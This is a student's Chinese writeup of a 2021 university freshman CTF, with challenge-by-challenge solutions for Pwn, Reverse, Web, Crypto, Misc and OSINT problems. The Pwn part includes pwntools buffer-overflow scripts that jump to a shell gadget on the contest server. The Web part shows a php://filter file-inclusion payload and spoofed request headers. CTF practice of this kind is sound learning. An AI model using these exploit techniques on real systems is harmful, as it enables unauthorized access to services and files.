---
title: 2021XJU CTF新生赛Writeup
date: '2021-10-25 23:39:25'
draft: false
categories:
  - CTF
tags:
  - "2021"
  - Crypto
  - CTF
  - Misc
  - Osint
  - Pwn
  - Reverse
  - Web
  - XJUSEC
  - XJU新生赛
  - 比赛
description: "2021 年 XJU CTF 新生赛解题记录，结合反汇编截图与脚本梳理题目分析和解题思路。"
---

## PWN

----

### 1.Pwn指北

下载附件直接拉到最下面即可
![image-20211025000814837](https://image.txgde.space/2021/10/image-20211025000814837.png)

### 2.test your nc

直接运行题目所给命令即可夺权-**nc 116.62.221.105 10001**
![image-20211025001335768](https://image.txgde.space/2021/10/image-20211025001335768.png)

### 3.RIP

下载附件rip,首先判断是多少位的程序:
![image-20211025214737923](https://image.txgde.space/2021/10/image-20211025214737923.png)
 64位,放到IDA64中打开分析,找到main函数,F5反编译:
![image-20211025215043784](https://image.txgde.space/2021/10/image-20211025215043784.png)

----

程序定义了一个长32的s字符串用以获取用户输入,但是gets()函数无法判断用户输入了多少个字符,发现溢出点. 接下来找用以夺权的函数,在fun中发现了bin/sh:
![image-20211025215426081](https://image.txgde.space/2021/10/image-20211025215426081.png)

![image-20211025221821849](https://image.txgde.space/2021/10/image-20211025221821849.png)
 转到汇编视图,发现程序在数据段中定义了command字符串,内容为"bin/sh",然后再0x4005BF这个地址将command放到了rdi寄存器中, 然后在后面调用了\_system函数(call指令),因此溢出操作后写入0x4005BF这个地址就可以夺权了(以上为我的理解,不是很透彻也可能会有错误) 因此构建以下脚本:

``` python
from pwn import *
r=remote("116.62.221.105",10002)
payload=b'a'*(32+8)+p64(0x4005BF)
r.sendline(payload)
r.interactive() 
```

执行脚本成功拿到flag
![image-20211025221711345](https://image.txgde.space/2021/10/image-20211025221711345.png)

### 4.level0

下载附件检查信息,是个64位程序
![image-20211025222745285](https://image.txgde.space/2021/10/image-20211025222745285.png)
 拖到IDA64中分析找到main函数,F5反编译:
![image-20211025223107306](https://image.txgde.space/2021/10/image-20211025223107306.png)
 双击进入函数:
![image-20211025223210470](https://image.txgde.space/2021/10/image-20211025223210470.png)
 发现buf长度为128,read()函数允许我们输入0x200个长度的数据,比128大,可以进行溢出操作,然后找夺权函数:
![image-20211025223934774](https://image.txgde.space/2021/10/image-20211025223934774.png)
 分析同上题一样,构建脚本:

``` python
from pwn import *
r=remote("116.62.221.105",10003)
payload=b'a'*(128+8)+p64(0x4011AA)
r.sendline(payload)
r.interactive() 
```

![image-20211025224140038](https://image.txgde.space/2021/10/image-20211025224140038.png)
 得到flag

### 5.Guess number

下载附件,分析为64位
![image-20211025224340577](https://image.txgde.space/2021/10/image-20211025224340577.png)
 拖到IDA64,分析:
![image-20211025224510616](https://image.txgde.space/2021/10/image-20211025224510616.png)
 双击打开func():
![image-20211025224601703](https://image.txgde.space/2021/10/image-20211025224601703.png)
 发现只要有一个长度为56的v1字符串和一个浮点数v2,而且当v2=11.28125,就可以拿到flag,但是发现我们输入的是v1,无法输入v2,继续分析:
![image-20211025224816420](https://image.txgde.space/2021/10/image-20211025224816420.png)
 发现v1字符串的地址在-0x40,v2浮点数在-0x08的位置,我们可以将-0x40到-0x08全填满然后将11.28215赋给v2. 这里我们还需要将11.28215转换为16进制:
![image-20211025225507436](https://image.txgde.space/2021/10/image-20211025225507436.png)
 在汇编视图,ucomiss比较指令后双击进入后面的数据可以找到11.28215的16进制表示:
![image-20211025225745186](https://image.txgde.space/2021/10/image-20211025225745186.png)
 构造以下python脚本:

``` python
from pwn import *
r=remote("116.62.221.105",10004)
payload=b'a'*(0x40-0x8)+p64(0x41348000)
r.sendline(payload)
r.interactive() 
```

![image-20211025225834268](https://image.txgde.space/2021/10/image-20211025225834268.png)

----

## Reverse

----

### 1.re签到

下载文件后解压得到
![image-20211025002846509](https://image.txgde.space/2021/10/image-20211025002846509.png)
 然后将其拖入到IDA中并且根据提示按Shift+F12得到如下视图,然后可在其中找到flag:
![image-20211025003021216](https://image.txgde.space/2021/10/image-20211025003021216.png)

### 2.game switch

下载附件得到
![image-20211025003204918](https://image.txgde.space/2021/10/image-20211025003204918.png)
 先直接运行
![image-20211025003241691](https://image.txgde.space/2021/10/image-20211025003241691.png)
 让输入0-8其中一个数(0为重启游戏),数据量不大直接先从1试到8,试到8时出现flag:
![image-20211025003453306](https://image.txgde.space/2021/10/image-20211025003453306.png)

### 3.再用IDA签一次到

下载得到2.exe文件,直接拖入IDA分析,找到main函数,F5反编译:
![image-20211025003726712](https://image.txgde.space/2021/10/image-20211025003726712.png)
 双击进入check\_flag()函数,得到如下代码:

``` c
int64 __fastcall check_flag(char *a1)
{
  __int64 result; // rax

  if ( *a1 != 120 )
    return 0i64;
  result = (unsigned __int8)a1[1];
  if ( (_BYTE)result == 106 )
  {
    result = (unsigned __int8)a1[2];
    if ( (_BYTE)result == 117 )
    {
      result = (unsigned __int8)a1[3];
      if ( (_BYTE)result == 123 )
      {
        result = (unsigned __int8)a1[4];
        if ( (_BYTE)result == 66 )
        {
          result = (unsigned __int8)a1[5];
          if ( (_BYTE)result == 105 )
          {
            result = (unsigned __int8)a1[6];
            if ( (_BYTE)result == 110 )
            {
              result = (unsigned __int8)a1[7];
              if ( (_BYTE)result == 97 )
              {
                result = (unsigned __int8)a1[8];
                if ( (_BYTE)result == 114 )
                {
                  result = (unsigned __int8)a1[9];
                  if ( (_BYTE)result == 121 )
                  {
                    result = (unsigned __int8)a1[10];
                    if ( (_BYTE)result == 95 )
                    {
                      result = (unsigned __int8)a1[11];
                      if ( (_BYTE)result == 83 )
                      {
                        result = (unsigned __int8)a1[12];
                        if ( (_BYTE)result == 116 )
                        {
                          result = (unsigned __int8)a1[13];
                          if ( (_BYTE)result == 97 )
                          {
                            result = (unsigned __int8)a1[14];
                            if ( (_BYTE)result == 110 )
                            {
                              result = (unsigned __int8)a1[15];
                              if ( (_BYTE)result == 100 )
                              {
                                result = (unsigned __int8)a1[16];
                                if ( (_BYTE)result == 95 )
                                {
                                  result = (unsigned __int8)a1[17];
                                  if ( (_BYTE)result == 85 )
                                  {
                                    result = (unsigned __int8)a1[18];
                                    if ( (_BYTE)result == 112 )
                                    {
                                      result = (unsigned __int8)a1[19];
                                      if ( (_BYTE)result == 125 )
                                      {
                                        printf("yes,this is a flag");
                                        getchar();
                                        result = 0i64;
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return result;
} 
```

经过分析可得程序将输入的v2字符串传到check\_flag()函数的a1中,然后将a1\[1\]-a1\[19\]中的字符与一个ASCII码进行对比,若全部相等则输出yes,this is a flag. 因此判断将所有ASCII码转为字符连起来即可得到flag,实际中会得到 ju{xxxxxx},根据flag格式前面应该缺一个 x ,补上即为正确flag

### 4.Nizdy不喜欢玩游戏

下载文件FlappyflappyBird.exe,拖入IDA分析,找到main函数,F5反编译:
![image-20211025004946233](https://image.txgde.space/2021/10/image-20211025004946233.png)
 题目说是玩到2021分就有flag,发现当score>2020时会输出real\[0\]和src,双击这俩变量进入汇编视图查看变量内容,如图:
![image-20211025005217219](https://image.txgde.space/2021/10/image-20211025005217219.png)
 可以很快发现src的内容与flag形式很像,猜测为凯撒密码,将其复制到凯撒密码解密器中枚举,得到flag:
![image-20211025005433577](https://image.txgde.space/2021/10/image-20211025005433577.png)

### 5.easyre

下载解压得到easyre.txt,打开发现是c语言,简单分析一下:
![image-20211025005923226](https://image.txgde.space/2021/10/image-20211025005923226.png)
 程序首先读入一个长度为21的`input`字符串,然后将input中的每个字符ASCII码减5,之后在与`"SEPN@>vR@G>JH@ZOJZPNx"`字符串进行比较,相同则输出`lucky!flag is your input`,于是编写c++语言脚本如下获得flag:
![image-20211025010919597](https://image.txgde.space/2021/10/image-20211025010919597.png)

----

## Web

----

### 1.robots

打开题目链接直接访问robots.txt文件:
![image-20211025011104880](https://image.txgde.space/2021/10/image-20211025011104880.png)
 根据robots内内容访问flaaaggg.php拿到flag:
![image-20211025011146021](https://image.txgde.space/2021/10/image-20211025011146021.png)

### 2.where is f1ag?

打开题目链接发现只有`FLAG is not here`,F12审查元素看看有没有什么提示:
![image-20211025011328003](https://image.txgde.space/2021/10/image-20211025011328003.png)
 发现`flag in web.pdf`,访问web.pdf在最下面发现flag:
![image-20211025011432030](https://image.txgde.space/2021/10/image-20211025011432030.png)

### 3.cookie

打开链接,根据题目提示直接F12查看cookie:
![image-20211025011532460](https://image.txgde.space/2021/10/image-20211025011532460.png)
 发现URL编码过的flag,解码得到`XJUSEC{you_find_C00kie!}`

### 4.get&post

打开题目链接发现以下PHP代码:

``` php
<?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['xju']) && isset($_POST['xjusec'])){
  $a = $_GET['xju'];
  $b = $_POST['xjusec'];
  if($a === 'welcome' && $b === 'xju'){
    echo $flag;
  }
}else {
  echo 'Do you know get&post?';
} 
```

简单分析可知服务器接收到一个`xju=welcome`的GET请求和`xjusec=xju`的POST请求即会执行`echo $flag`语句,按条件发送后得到flag:
![image-20211025012219767](https://image.txgde.space/2021/10/image-20211025012219767.png)

### 5.绯红之王

打开题目链接发现有个名为`give me flag`访问地址为`/flag.php`的超级链接,点击后跳转到百度,猜测网页进行了重定向,flag就在flag.php中,于是利用linux下curl命令默认不跟随重定向的特点访问flag.php得到flag:
![image-20211025012627955](https://image.txgde.space/2021/10/image-20211025012627955.png)

### 6.伪协议

打开题目链接得到如下代码:

``` php
<?php 
$a = $_GET["a"];
$b = $_GET["b"];
if(isset($a)&&(file_get_contents($a,'r')==="Happy 1024")){
  include($b);  //flag.php
}
else{
  highlight_file(__FILE__);
}
?> 
```

简单分析代码,当`file_get_contents($a,'r')`的值等于`"Happy 1024"`时可以执行`include($b)`语句,flag在flag.php文件中 首先访问flag.php:
![image-20211025015138723](https://image.txgde.space/2021/10/image-20211025015138723.png)
 发现获取不了flag,根据题目提示,该题需要使用伪协议,首先试着访问phpinfo看看可以使用哪些伪协议,发现找不到phpinfo文件(可能是我没找到),于是我先试了试php://input伪协议进行传入`"Happy 1024"`使file\_get\_contents($a,'r')得到的值为`Happy 1024`,如图:
![image-20211025014223111](https://image.txgde.space/2021/10/image-20211025014223111.png)
 服务器返回`Warning: include(): Filename cannot be empty in /var/www/html/index.php`错误,意思是include()函数内容不能为空,这就意味着成功执行了`include($b)`语句,因为没有传b的值而报错. 也说明php://伪协议是可以用的.接下来来传b的值通过伪协议访问flag.php. 这里使用php://filter伪协议中的read,因为要得到**php文件**的源码,我们要对其进行base64编码,即`php://filter/read=convert.base64-encode/resource=flag.php`得到一串base64编码的字符串:
![image-20211025015702488](https://image.txgde.space/2021/10/image-20211025015702488.png)
 对其解码得到flag:
![image-20211025015757220](https://image.txgde.space/2021/10/image-20211025015757220.png)

### 7.Do you know http?

打开题目链接得:
![image-20211025015902356](https://image.txgde.space/2021/10/image-20211025015902356.png)
 于是使用burpsuite发送一个请求方法为`Ethe`的请求:
![image-20211025020027910](https://image.txgde.space/2021/10/image-20211025020027910.png)
 提示"只有本地登陆才可以哦！",然后加入X-Forwarded-For请求头,值为`127.0.0.1`:
![image-20211025020244644](https://image.txgde.space/2021/10/image-20211025020244644.png)
 又提示"只有从`www.xjusec.com`过来的人才能看到下一步哦！",加入Referer请求头,值为`www.xjusec.com` :
![image-20211025020511386](https://image.txgde.space/2021/10/image-20211025020511386.png)
 又\*\*提示"你为什么不用'xju'这个官方浏览器！！" ,把User-Agent请求头的值改为xju得:
![image-20211025020612135](https://image.txgde.space/2021/10/image-20211025020612135.png)
 终于拿到了flag!!!!

----

## Crypto

----

### 1.Crypto指南

下载附件CRYPTO.pdf,拉到最下面得到flag:
![image-20211025153716169](https://image.txgde.space/2021/10/image-20211025153716169.png)

### 2.社会主义核心阿弥陀佛

下载附件得到一个txt文件,里面内容为:

``` Plain
诚信自由自由友善平等友善法治敬业友善平等友善爱国公正敬业友善平等诚信民主富强友善爱国诚信平等诚信民主友善公正敬业诚信富强友善爱国公正友善平等文明敬业敬业诚信自由平等友善平等友善法治爱国诚信文明友善爱国平等敬业和谐爱国公正诚信自由爱国爱国富强友善平等公正友善爱国法治友善平等友善法治友善平等富强友善爱国公正敬业敬业友善平等友善自由诚信自由公正爱国和谐诚信民主和谐友善爱国平等敬业富强爱国敬业诚信自由平等敬业和谐爱国公正友善爱国法治诚信富强自由敬业敬业友善爱国公正爱国和谐友善平等和谐友善爱国公正友善自由文明友善平等平等友善爱国公正诚信民主友善公正友善自由友善平等友善爱国平等敬业民主敬业富强友善爱国平等友善自由自由友善平等法治友善爱国公正敬业诚信民主诚信民主富强友善爱国法治敬业诚信富强友善自由自由诚信自由敬业爱国和谐诚信民主友善法治友善爱国爱国诚信富强爱国诚信民主公正诚信自由公正爱国富强诚信富强友善敬业友善爱国平等诚信民主友善爱国敬业法治友善爱国和谐爱国富强爱国文明诚信自由自由友善平等诚信自由爱国自由诚信自由自由友善平等诚信民主友善自由平等友善爱国公正爱国富强友善自由诚信平等友善爱国公正爱国富强敬业公正友善爱国自由诚信民主诚信平等诚信民主民主诚信自由公正敬业敬业友善平等诚信富强友善爱国公正爱国敬业爱国富强诚信自由平等爱国公正诚信富强平等诚信自由平等爱国诚信民主敬业诚信和谐友善爱国自由诚信民主友善爱国爱国自由友善爱国平等友善自由诚信平等诚信富强友善平等友善爱国公正爱国富强诚信富强诚信平等诚信自由公正敬业民主友善自由敬业友善爱国法治友善自由平等敬业诚信自由诚信自由自由友善平等诚信平等诚信民主民主诚信自由平等敬业文明敬业文明友善爱国法治敬业友善自由诚信富强自由友善爱国公正诚信民主诚信文明诚信富强友善平等诚信自由公正友善平等和谐友善自由文明友善爱国法治爱国自由友善自由民主诚信自由平等诚信富强自由诚信富强法治友善爱国公正爱国和谐诚信民主和谐诚信自由公正敬业平等友善平等爱国友善爱国公正友善平等公正爱国平等诚信自由平等敬业民主敬业富强友善爱国敬业爱国文明友善自由和谐友善爱国法治友善自由友善平等敬业诚信平等诚信自由公正诚信富强文明诚信民主平等诚信自由自由友善平等诚信民主诚信富强平等诚信自由爱国爱国爱国友善自由友善公正诚信自由平等诚信民主爱国敬业诚信和谐诚信自由法治诚信民主友善法治诚信民主富强诚信自由爱国敬业爱国爱国法治友善爱国公正友善自由友善法治友善平等友善平等诚信自由公正友善自由文明诚信民主平等诚信自由法治友善平等友善爱国友善自由友善敬业友善爱国法治友善平等诚信和谐友善平等富强友善爱国敬业爱国公正诚信富强诚信平等友善爱国平等敬业民主敬业富强诚信自由自由诚信民主诚信自由敬业友善法治诚信自由法治友善平等诚信和谐诚信民主富强诚信自由平等爱国友善敬业爱国和谐诚信自由平等诚信富强平等友善自由文明诚信自由法治友善自由平等敬业友善爱国友善爱国平等友善平等诚信自由敬业法治诚信自由爱国友善自由爱国友善平等公正诚信自由公正爱国富强友善自由诚信平等诚信自由敬业敬业敬业诚信富强自由诚信自由平等友善自由平等诚信富强文明诚信自由平等友善自由敬业爱国公正友善爱国平等友善自由诚信自由诚信富强自由 
```

以前在网上瞎看的时候看到一个"核心价值观编码",于是拿上去解码得:
![image-20211025154235376](https://image.txgde.space/2021/10/image-20211025154235376.png)
 根据题目提示和密文格式,判断是"与佛论禅",拿上去解码得flag:
![image-20211025154329740](https://image.txgde.space/2021/10/image-20211025154329740.png)

### 3.爱弹贝斯的Caesar

下载附件得到一个txt文件,内容为`S1dIRlJQezd1cl8yYWZqUmVfMWZfdW5lcV82Yl9ndTFheF8wNX0=` 根据题目"贝斯"和密文内容,猜测为base64编码,解码得:
![image-20211025154542804](https://image.txgde.space/2021/10/image-20211025154542804.png)
 发现又为一串密文,观察格式判断可能为凯撒密码,用工具枚举得到flag:
![image-20211025154725298](https://image.txgde.space/2021/10/image-20211025154725298.png)

### 4.小羊跳栅栏

题目密文为:`XXJJUUSCETCF{_WhEaLVCe0_MgEo_0TdO__T1i0m2e4}`,根据题目提示猜测为栅栏密码, 用工具枚举到22得到flag:
![image-20211025154922737](https://image.txgde.space/2021/10/image-20211025154922737.png)

### 5.d\=(￣▽￣\*)b

下载附件,得到一个名为txt的文件.用notepad++打开的:
![image-20211025155246508](https://image.txgde.space/2021/10/image-20211025155246508.png)
 发现是一堆符号组成的表情,我先到网上搜索表情密码,但是没有获得有效信息,后来不断搜索得知这种东西叫颜文字(知道这东西但用的不多,一时半会没想起来),于是又在网上搜了颜文字密码(aaencode),解密得到flag:
![image-20211025155813049](https://image.txgde.space/2021/10/image-20211025155813049.png)

### 6.ROT全家桶

题目给出`z(wu#!LH9780h07eK4JC047;BN`这一串密文,根据题目提示,应该是ROT系列加密,而且不止一种,于是用工具进行解密: 首先我用ROT47解密得到`KWHFRP{whfg_9_f6zcyr_cfjq}`,以为接下来是凯撒密码,于是我拿去枚举,得到:
![image-20211025160418568](https://image.txgde.space/2021/10/image-20211025160418568.png)
 将其填入flag,提示错误(黑人问号脸???), 然后仔细看了看我得到的这个flag,发现不能连成一句话,又想想题目,觉得应该不止一次ROT加密,于是又把上一步得到的字符串拿去ROT解密,接下来用ROT18解密试试:
![image-20211025160737367](https://image.txgde.space/2021/10/image-20211025160737367.png)
 得到应该神似flag的字符串,拿去试试,成功

### 7.我emo了

下载附件得emo.txt, 里面内容为`👏👁👌👊🐼🐺👲👜👤👦👖👦👥👣👰👖👫👟👩👜👜👖👛👜👚👦👛👠👥👞👖👤👜👫👟👦👛👪👴`,根据题目和文件名提示,猜测是一个与emoji有关的密码,去网上搜索,得到相关解密网站,解密得:
![image-20211025161103301](https://image.txgde.space/2021/10/image-20211025161103301.png)

### 8.calendar

下载附件得到一串字符串 `S21 F1 T12 T11 T22 M1 F1 M3`,根据题目提示,在网上搜索日历密码,发现以下解密方法:
![image-20211025161803100](https://image.txgde.space/2021/10/image-20211025161803100.png)
 于是根据题中所给hint手动解密(失败好几次)得flag:
![image-20211025161849524](https://image.txgde.space/2021/10/image-20211025161849524.png)

### 9.给我的宝剑附个魔

下载附件解压为一张图片:
![image-20211025161958159](https://image.txgde.space/2021/10/image-20211025161958159.png)
 开始想的是图片隐写(中间写图片隐写写迷了),好久后才发现这是道密码题,在网上搜索跟我的世界附魔方面有关的密码发现有个叫"标准银河字母"的东西:
![image-20211025162329783](https://image.txgde.space/2021/10/image-20211025162329783.png)
 然后对照得到3串字符串,刚开始不知道哪一部分是flag,交了好几个也都错了,想了一会决定拿最后一句赌一把,最后一串大致为`flag is standard galaxy word`,于是拿`standard galaxy word`转大写包上XJUSEC{}交了,成功.

----

## Misc

----

### 1.你是为网络安全而生的

关注公众号即可得到flag

### 2.眼见为虚

下载附件得到一个压缩包,解压,又得到一个压缩包,再解压,得到一个flag.txt,打开即可得到flag:
![image-20211025203118107](https://image.txgde.space/2021/10/image-20211025203118107.png)

### 3.签退

打开题目所给网址填完问卷即可得到flag

### 4.谁会拒绝嘉然呢？

下载文件名为zip的附件,根据文件名猜测是个zip压缩包,解压得到"谁会拒绝嘉然呢"文件夹:
![image-20211025203540591](https://image.txgde.space/2021/10/image-20211025203540591.png)
 运行exe文件发现是个拼图游戏,根据题目以及里面图片的提示决定直接拼,将图片一张一张往word里拖慢慢拼,最后可以得到flag(当时没有保存实在是不想再拼一遍了)

### 5.你画我猜

下载文件解压,得到一个mrf结尾的文件,经过反复搜索确认(搜了好久),确定是个记录鼠标轨迹的文件,可以用相应的软件(下了好多软件,最终确认是MouseRecorder)打开复现鼠标轨迹:
![image-20211025204022521](https://image.txgde.space/2021/10/image-20211025204022521.png)
 准备打开画图复现轨迹,但是软件总是报错,最后将Window change这一项删掉后就可以正常复现了
![image-20211025225922662](https://image.txgde.space/2021/10/image-20211025225922662.png)

![image-20211025204600748](https://image.txgde.space/2021/10/image-20211025204600748.png)

![image-20211025204451999](https://image.txgde.space/2021/10/image-20211025204451999.png)

### 6.你究竟会不会看图片啊？

下载题目附件解压得到一个有密码的压缩包和一个二维码:
![image-20211025205053058](https://image.txgde.space/2021/10/image-20211025205053058.png)
 扫描二维码得到一句"Do you know when Shanny's birthday is",得到关键信息-解压密码有可能是一个生日. 于是用c语言写了一个字典:

 ``` c++
 #include<iostream> 
 #include<cstdio> 
 using namespace std; 
 int main(){ 
  freopen("bar.txt","w",stdout); 
  for(int j=01;j<=12;j++){
    for(int k=1;k<=31;k++){ 
      if(j/10==0) cout<<0; cout<<j<<""; 
      if(k/10==0) cout<<0; cout<<k<<endl; 
    } 
  }
} 
```

![image-20211025230317616](https://image.txgde.space/2021/10/image-20211025230317616.png)
 然后用github上的zipcrack跑密码,得到密码为0308:
![image-20211025230549981](https://image.txgde.space/2021/10/image-20211025230549981.png)
 输入密码解压得到两张图片猜测是图片隐写 用01editor打开,在第一张图片里发现`XJUSEC{Y0u_h2ve_a1r2ady_XJUSEC{w0w j1ng rucb5439345d8b014396}`
![image-20211025205858897](https://image.txgde.space/2021/10/image-20211025205858897.png)
 第二张里发现flag:`a1r2ady_sta1ted}`:
![image-20211025205956732](https://image.txgde.space/2021/10/image-20211025205956732.png)
 拼接得到flag: `XJUSEC{Y0u_h2ve_a1r2ady_sta1ted}`

### 7.暗藏玄机的excel

下载附件flag.xlsx,打开查看里面内容,发现几条重要信息:
![image-20211025211438283](https://image.txgde.space/2021/10/image-20211025211438283.png)

![image-20211025211507228](https://image.txgde.space/2021/10/image-20211025211507228.png)

![image-20211025211614649](https://image.txgde.space/2021/10/image-20211025211614649.png)
 根据最后一个提示,我用01editor打开这个文件发现文件头为`50 4B 03 04`判断是个zip压缩包:
![image-20211025211756918](https://image.txgde.space/2021/10/image-20211025211756918.png)
 解压得:
![image-20211025211958198](https://image.txgde.space/2021/10/image-20211025211958198.png)
 里面有很多文件,找了一会后发现几个信息:
![image-20211025212701885](https://image.txgde.space/2021/10/image-20211025212701885.png)

![image-20211025212346719](https://image.txgde.space/2021/10/image-20211025212346719.png)
 后来觉得开始excel里给的几个提示也许有用,一个是"表一少了什么,有什么东西看不见",一个是"你不觉得表一中的嘉然很可爱吗",觉得可能flag藏在这两个地方相关的文件里,于是notepad++打开几个相关的文件,发现了一些信息,如图:
![image-20211025213252838](https://image.txgde.space/2021/10/image-20211025213252838.png)

![image-20211025213302291](https://image.txgde.space/2021/10/image-20211025213302291.png)
 从这两个信息判断出这个图片一个隐藏了一个加密的zip的压缩包,把图片送进01editor搜索zip文件头`50 4B 03 04`文件头,发现:
![image-20211025213500288](https://image.txgde.space/2021/10/image-20211025213500288.png)
 文件尾刚好也是`00 00 00 00`,确定是个zip压缩包,将`50 4B 03 04`及以下16进制代码另存为一个fffflag.zip:
![image-20211025213719297](https://image.txgde.space/2021/10/image-20211025213719297.png)
 解压,密码在上面已获得,得到flag:
![image-20211025213848528](https://image.txgde.space/2021/10/image-20211025213848528.png)

----

## Osint

----

### 1.找找flag?

根据题目提示访问Github搜索Ethe448,发现有一个hexo博客的项目,仔细看了看发现有个Secret(题目中的"小秘密"),打开得到两张图片:
![image-20211025213925365](https://image.txgde.space/2021/10/image-20211025213925365.png)
 拼接二维码扫描得flag:
![image-20211025214136400](https://image.txgde.space/2021/10/image-20211025214136400.png)

![image-20211025214232394](https://image.txgde.space/2021/10/image-20211025214232394.png)
